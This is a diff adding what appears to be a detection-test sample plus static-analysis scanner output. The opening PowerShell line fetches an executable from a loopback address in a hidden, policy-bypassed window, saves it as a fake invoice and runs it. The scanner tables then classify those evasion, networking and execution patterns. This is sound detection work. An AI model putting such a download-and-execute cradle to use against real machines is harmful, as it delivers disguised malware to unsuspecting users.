@@ -1,0 +1,58 @@
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue' -ScriptBlock { (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'}
+[*] Scanning file: ./test2.ps1
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Evasion/Bypass in ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                    -ExecutionPolicy                    │
+└────────────────────────────────────────────────────────┘
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Networking in ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                     webclient                      │
+│                    DownloadFile                    │
+│                System.Net.WebClient                │
+└────────────────────────────────────────────────────┘
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Execution in ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                   Start-Process                   │
+└───────────────────────────────────────────────────┘
+
+[*] Extracting URLs from ./test2.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted URLs from ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│    http://127.0.0.1/1.exe',     │
+└─────────────────────────────────┘
+
+[*] Extracting Domains from ./test2.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted Domains from ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│        System.Net.WebClient        │
+│           powershell.exe           │
+│            invoice.exe             │
+└────────────────────────────────────┘
+
+[*] Extracting File Paths from ./test2.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted File Paths from ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│ C:\\\\test-MDATP-test\\\\invoice.exe  │
+└───────────────────────────────────────┘
+
+[*] Extracting IP Addresses from ./test2.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted IP Addresses from ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                127.0.0.1                │
+└─────────────────────────────────────────┘
+
+[*] Extracting Files from ./test2.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted Files from ./test2.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│          powershell.exe          │
+│           invoice.exe            │
+│              1.exe               │
+└──────────────────────────────────┘
